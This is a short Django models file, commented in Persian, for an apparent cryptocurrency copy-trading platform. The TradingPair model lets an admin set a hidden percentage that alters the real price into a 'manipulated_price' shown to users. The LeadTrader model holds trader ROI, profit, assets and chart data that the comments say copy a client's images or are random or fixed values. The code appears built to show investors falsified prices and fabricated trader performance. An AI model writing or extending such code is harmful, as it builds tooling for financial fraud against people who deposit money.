from django.db import models
import random

class TradingPair(models.Model):
    """مدل ارزها با قابلیت دستکاری قیمت توسط ادمین"""
    symbol = models.CharField(max_length=20, unique=True) # BTC/USDT
    display_name = models.CharField(max_length=50) # نام رندومی که مشتری خواست
    real_price = models.DecimalField(max_digits=20, decimal_places=8)
    
    # فیلد دستکاری: ادمین اینجا درصد سود/ضرر دستی را وارد می‌کند
    # مثلا 2.0 یعنی 2 درصد سود به قیمت واقعی اضافه شود
    manual_profit_percent = models.FloatField(default=0.0) 
    
    is_active = models.BooleanField(default=True)

    @property
    def manipulated_price(self):
        """قیمتی که کاربر نهایتا مشاهده می‌کند"""
        adjustment = (float(self.real_price) * self.manual_profit_percent) / 100
        return float(self.real_price) + adjustment

    def __str__(self):
        return f"{self.display_name} ({self.symbol})"

class LeadTrader(models.Model):
    """مدل تریدرها دقیقا مطابق عکس‌های ارسالی کارفرما"""
    name = models.CharField(max_length=100)
    avatar = models.ImageField(upload_to='traders/', blank=True, null=True)
    roi_30d = models.DecimalField(max_digits=10, decimal_places=2) # +1,187.6%
    pnl_30d = models.DecimalField(max_digits=20, decimal_places=2) # 30D Profit
    aum = models.DecimalField(max_digits=20, decimal_places=2) # Assets Under Management
    max_drawdown = models.DecimalField(max_digits=5, decimal_places=2)
    followers_count = models.IntegerField(default=0)
    followers_limit = models.IntegerField(default=50)
    
    # برای رسم نمودار خطی کوچک در کارت تریدر (مقادیر رندوم یا ثابت)
    chart_data_json = models.JSONField(help_text="History data for small chart line")

    def __str__(self):
        return self.name